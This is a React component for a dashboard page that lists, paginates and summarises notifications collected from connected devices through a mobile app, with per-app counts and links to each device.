import React, { useState, useEffect, useCallback } from 'react';
import { Link } from 'react-router-dom';
import { toast } from 'react-toastify';
import apiService from '../../services/apiService';
import './Dashboard.css';

const Notifications = () => {
  const [notifications, setNotifications] = useState([]);
  const [loading, setLoading] = useState(true);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [stats, setStats] = useState({});

  const fetchNotifications = useCallback(async () => {
    try {
      setLoading(true);
      const data = await apiService.getNotifications(currentPage);
      setNotifications(data.notifications || []);
      setTotalPages(data.totalPages || 1);
    } catch (error) {
      console.error('Error fetching notifications:', error);
      toast.error('Error loading notifications');
    } finally {
      setLoading(false);
    }
  }, [currentPage]);

  useEffect(() => {
    fetchNotifications();
    fetchStats();
  }, [fetchNotifications]);

  const fetchStats = async () => {
    try {
      const data = await apiService.request('/api/notifications/stats');
      
      if (data.success) {
        setStats(data.data);
      }
    } catch (error) {
      console.error('Error fetching stats:', error);
    }
  };

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  if (loading) {
    return (
      <div className="dashboard-container">
        <div className="loading">Loading notifications...</div>
      </div>
    );
  }

  return (
    <div className="dashboard-container">
      <header className="dashboard-header">
        <Link to="/" className="back-button">← Back to Dashboard</Link>
        <h1>🔔 All Notifications</h1>
        <p>Notifications from all connected devices</p>
      </header>

      {/* Stats */}
      <div className="stats-grid">
        <div className="stat-card">
          <div className="stat-icon">🔔</div>
          <div className="stat-content">
            <h3>{stats.totalNotifications || 0}</h3>
            <p>Total Notifications</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">📱</div>
          <div className="stat-content">
            <h3>{stats.appStats?.length || 0}</h3>
            <p>Active Apps</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">📅</div>
          <div className="stat-content">
            <h3>{stats.recentActivity || 0}</h3>
            <p>Last 7 Days</p>
          </div>
        </div>
        
        <div className="stat-card">
          <div className="stat-icon">📊</div>
          <div className="stat-content">
            <h3>{stats.todayNotifications || 0}</h3>
            <p>Today</p>
          </div>
        </div>
      </div>

      {/* Top Apps */}
      {stats.appStats && stats.appStats.length > 0 && (
        <div className="top-apps-section">
          <h2>📱 Most Active Apps</h2>
          <div className="apps-stats-grid">
            {stats.appStats.slice(0, 5).map((app, index) => (
              <div key={index} className="app-stat-card">
                <div className="app-stat-icon">📱</div>
                <div className="app-stat-content">
                  <h4>{app._id}</h4>
                  <p>{app.count} notifications</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Notifications List */}
      <div className="notifications-section">
        <h2>🔔 Recent Notifications</h2>
        
        {notifications.length === 0 ? (
          <div className="no-data">
            <p>No notifications yet</p>
            <p>Install the mobile app to start collecting notifications</p>
          </div>
        ) : (
          <>
            <div className="notifications-list">
              {notifications.map(notification => (
                <div key={notification._id} className="notification-item">
                  <div className="notification-content">
                    <div className="notification-header">
                      <h4>{notification.title}</h4>
                      <span className="device-id">Device: {notification.user}</span>
                    </div>
                    <p>{notification.body}</p>
                    <div className="notification-meta">
                      <span className="app-name">{notification.appName}</span>
                      <span className="package-name">{notification.packageName}</span>
                      <span className="timestamp">
                        {formatDate(notification.timestamp)}
                      </span>
                    </div>
                  </div>
                  <div className="notification-actions">
                    <Link to={`/user/${notification.user}`} className="action-button">
                      View Device
                    </Link>
                  </div>
                </div>
              ))}
            </div>

            {/* Pagination */}
            {totalPages > 1 && (
              <div className="pagination">
                <button 
                  onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}
                  disabled={currentPage === 1}
                  className="pagination-button"
                >
                  Previous
                </button>
                <span className="page-info">
                  Page {currentPage} of {totalPages}
                </span>
                <button 
                  onClick={() => setCurrentPage(prev => Math.min(totalPages, prev + 1))}
                  disabled={currentPage === totalPages}
                  className="pagination-button"
                >
                  Next
                </button>
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default Notifications; 